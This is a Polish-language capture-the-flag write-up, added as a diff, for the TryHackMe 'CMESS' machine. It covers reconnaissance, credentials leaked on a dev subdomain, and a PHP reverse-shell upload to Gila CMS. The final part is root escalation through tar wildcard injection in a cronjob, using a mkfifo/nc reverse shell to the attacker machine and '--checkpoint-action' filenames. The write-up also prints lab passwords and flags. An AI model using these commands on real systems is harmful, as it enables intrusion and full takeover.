@@ -1,0 +1,297 @@
+Projekt 4 - CMESS
+
+*Rekonesans*
+*Na poczatek wykonuje skanowanie za pomoca nmap:*
+```
+sudo nmap -Pn cmess.thm
+```
+
+Nmap scan report for cmess.thm (10.10.114.226)
+Host is up (0.055s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+*Skanowanie systemu operacyjnego i usług:*
+```
+nmap -p 22,80 -A cmess.thm 
+```
+
+Nmap scan report for cmess.thm (10.10.114.226)
+Host is up (0.20s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
+|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
+|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|http-generator: Gila CMS
+|http-server-header: Apache/2.4.18 (Ubuntu)
+| http-robots.txt: 3 disallowed entries 
+|/src/ /themes/ /lib/
+|http-title: Site doesn't have a title (text/html; charset=UTF-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+*Skanowanie Vuln:*
+nmap --script vuln -p 22,80 cmess.thm
+
+
+
+*W tym momencie dokonuję enumeracji katalogu w celu wyszukania ukrytych
+katalogów na serwerze www:*
+```
+gobuster dir -u http://10.10.114.226 --wordlist /usr/share/wordlists/dirb/common.txt
+```
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.114.226
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/09/25 11:27:32 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/0                    (Status: 200) [Size: 3863]
+/01                   (Status: 200) [Size: 4094]
+/1                    (Status: 200) [Size: 4094]
+/1x1                  (Status: 200) [Size: 4094]
+/about                (Status: 200) [Size: 3361]
+/About                (Status: 200) [Size: 3347]
+/admin                (Status: 200) [Size: 1584]
+/api                  (Status: 200) [Size: 0]   
+/assets               (Status: 301) [Size: 326] [--> http://10.10.114.226/assets/?url=assets]
+/author               (Status: 200) [Size: 3602]                                             
+/blog                 (Status: 200) [Size: 3863]                                             
+/category             (Status: 200) [Size: 3874]                                             
+/cm                   (Status: 500) [Size: 0]                                                
+/feed                 (Status: 200) [Size: 735]                                              
+/fm                   (Status: 200) [Size: 0]                                                
+/Index                (Status: 200) [Size: 3863]                                             
+/index                (Status: 200) [Size: 3863]                                             
+/lib                  (Status: 301) [Size: 320] [--> http://10.10.114.226/lib/?url=lib]      
+/log                  (Status: 301) [Size: 320] [--> http://10.10.114.226/log/?url=log]      
+/login                (Status: 200) [Size: 1584]                                             
+/robots.txt           (Status: 200) [Size: 65]                                               
+/search               (Status: 200) [Size: 3863]                                             
+/Search               (Status: 200) [Size: 3863]                                             
+/server-status        (Status: 403) [Size: 278]                                              
+/sites                (Status: 301) [Size: 324] [--> http://10.10.114.226/sites/?url=sites]  
+/src                  (Status: 301) [Size: 320] [--> http://10.10.114.226/src/?url=src]      
+/tags                 (Status: 200) [Size: 3147]                                             
+/tag                  (Status: 200) [Size: 3886]                                             
+/themes               (Status: 301) [Size: 326] [--> http://10.10.114.226/themes/?url=themes]
+/tmp                  (Status: 301) [Size: 320] [--> http://10.10.114.226/tmp/?url=tmp]      
+                                                                                             
+===============================================================
+2022/09/25 11:28:07 Finished
+===============================================================
+
+Pojawia się plik robots.txt który może zawierać ciekae informacje. 
+Wyświetla się również katalog /admin, który ma stronę logowania Gila Cms.
+
+*W przeglądarce:*
+http://10.10.114.226/robots.txt
+
+*Pojawiają sie:*
+User-agent: *
+Disallow: /src/
+Disallow: /themes/
+Disallow: /lib/
+
+
+*Przeszukiwanie subdomen:*
+wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm" --hw 290 -H "Host: FUZZ.cmess.thm"
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                     
+=====================================================================
+
+000000019:   200        30 L     104 W      934 Ch      "dev"   
+
+*Teraz należy dodać subdomenę dev w /etc/hosts:*
+127.0.0.1       localhost
+127.0.1.1       kali
+10.10.114.226   cmess.thm
+10.10.114.226   dev.cmess.thm
+
+*W przeglądarce:*
+dev.cmess.thm
+
+*Przeglądanie subdomeny:*
+curl -s dev.cmess.thm | html2text
+
+andre@cmess.thm
+        That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
+        support@cmess.thm
+        Your password has been reset. Here: KPFTN_f2yxe% 
+
+
+**Wyświetlono adres email oraz hasło:**
+email: andre@cmess.thm
+password: KPFTN_f2yxe%
+
+*W przeglądarce:*
+10.10.114.226/admin
+
+*Po zalogowaniu sie:*
+content
+File Manager
+
+*Wersja oprogramowania to:*
+Gila CMS version 1.10.9
+
+```
+searchsploit gila cms  
+```                                                                                                                            
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                             |  Path
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Gila CMS 1.11.8 - 'query' SQL Injection                                                                                    | php/webapps/48590.py
+Gila CMS 1.9.1 - Cross-Site Scripting                                                                                      | php/webapps/46557.txt
+Gila CMS 2.0.0 - Remote Code Execution (Unauthenticated)                                                                   | php/webapps/49412.py
+Gila CMS < 1.11.1 - Local File Inclusion                                                                                   | multiple/webapps/47407.txt
+
+*Przeczytanie exploita:*
+```
+searchsploit -x 47407
+```
+
+Login into the application as an admin user or equivalent user and go the
+below link
+
+http://localhost/gilacms/admin/fm/?f=src../../../../../../../../../WINDOWS/system32/drivers/etc/hosts
+
+W przeglądarce:
+cmess.thm/admin/fm/?f=src../../../../../../../../../../etc/passwd
+
+**Nie powiodło się !!!**
+
+*W menedżerze plików:*
+Teraz należy załadować plik
+upload
+
+*Przygotowanie odwrotnej powłoki php:*
+```
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+```
+
+*Załadowanie pliku na stronie.*
+Plik został zapisany w /assets
+
+*Kali Linux:*
+```
+nc -nvlp 4444
+```
+
+*W przeglądarce:*
+cmess.thm/assets/revshell.php
+
+**Nawiązanie shella!!!**
+
+*Teraz jestem użytkownikiem www-data*
+```
+cd opt
+cat .password.bak
+andres backup password
+UQfsdCB7aAP6
+```
+
+*W nowym oknie Kali Linux połączenie przez SSH:*
+ssh andre@10.10.114.226
+password: UQfsdCB7aAP6
+
+cat user.txt
+Flaga: thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
+
+*Eskalacja uprawnień*
+sudo -l niewiele wykazało
+
+Przesłanie linpeas.sh na target.
+
+Okazuje się że można spróbować z cronjob.
+cat /etc/crontab
+
+```
+Cronjob przechodzi do katalogu /home/andre/backup 
+i uruchamia polecenie tar jako symbol wieloznaczny(*), 
+ponieważ zawiera *
+
+*/2 *   * * *   root cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
+```
+
+```
+cd /home/andre/backup
+```
+
+Wejście na strone https://gtfobins.github.io/gtfobins/tar/
+```
+Wyszukanie tar
+```
+
+W katalogu /home/andre/backup, należy stworzyć 
+plik o nazwie shell.sh
+```
+Kod:
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+
+chmod +x shell.sh
+./shell.sh
+
+```
+
+Teraz należy zaczekać kilka minu na uruchomienie cronjob.
+```
+ls -al /tmp
+```
+
+W katalogu tmp utworzony został czerwony plik rootbash.
+```
+cd /tmp
+./rootbash -p
+```
+**Mam roota!!!**
+
+*Inna metoda:*
+
+*Target:*
+```
+cd /home/andre/backup
+```
+*Stworzyć plik shell.sh*
+```
+Kod:
+echo "mkfifo /tmp/lhennp; nc <Ip Kali Linux> 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+
+
+chmod +x shell.sh
+./shell.sh
+```
+
+*Kali Linux:*
+```
+nc -nvlp 8888
+```
+
+Należy zaczekać kilka minut
+
+**Mam roota!!!**
+```
+cat /root/root.txt
+Flaga: thm{9f85b7fdeb2cf96985bf5761a93546a2}
+```
